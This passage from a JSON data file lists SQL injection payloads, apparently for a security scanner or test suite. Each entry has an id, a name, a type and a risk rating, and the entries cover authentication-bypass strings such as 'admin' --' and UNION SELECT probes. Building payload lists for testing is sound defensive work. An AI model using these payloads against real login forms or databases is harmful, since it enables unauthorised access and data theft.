    { "id": "SQLI-003", "name": "Admin Quote Bypass", "payload": "admin' --", "type": "auth_bypass", "risk": "critical" },
    { "id": "SQLI-004", "name": "Admin Slash-Star Bypass", "payload": "admin' /*", "type": "auth_bypass", "risk": "critical" },
    { "id": "SQLI-005", "name": "Union Select Null Test", "payload": "1' UNION SELECT NULL--", "type": "union_based", "risk": "high" },
    { "id": "SQLI-006", "name": "Union Select Multi-Column", "payload": "' UNION ALL SELECT NULL,NULL,NULL--", "type": "union_based", "risk": "high" },
